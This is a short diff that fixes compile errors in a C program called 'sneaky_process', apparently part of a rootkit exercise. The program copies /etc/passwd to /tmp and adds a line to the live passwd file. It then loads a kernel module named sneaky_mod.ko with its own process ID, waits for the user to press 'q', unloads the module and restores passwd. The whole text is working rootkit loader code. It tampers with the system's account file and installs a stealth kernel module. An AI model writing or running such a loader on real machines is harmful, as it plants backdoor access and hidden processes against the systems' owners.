@@ -1,11 +1,12 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <linux/moduleparam.h>
+#include <unistd.h>
+
 
 int main(void) {
     //print process ID
-    printf("sneaky_process pid = %d\n", getpid());
-    pid = getpid();
+    int pid = (int)getpid();
+    printf("sneaky_process pid = %d\n", pid);
     //copt passwd file
     system("cp /etc/passwd /tmp");
     //add new line to passwd
@@ -14,13 +15,13 @@ int main(void) {
     fclose(out);  
     //load module
     char buffer [100];
-    snprintf (buffer, 100, "insmod sneaky_mod.ko pid=%d", getpid());
+    snprintf (buffer, 100, "insmod sneaky_mod.ko pid=%d", pid);
     system(buffer);
     //loop
     char cur;
     do {
-        c = getchar();
-    } while (c != 'q');
+        cur = getchar();
+    } while (cur != 'q');
     //unload module
     system("rmmod sneaky_mod");
     //restore passwd
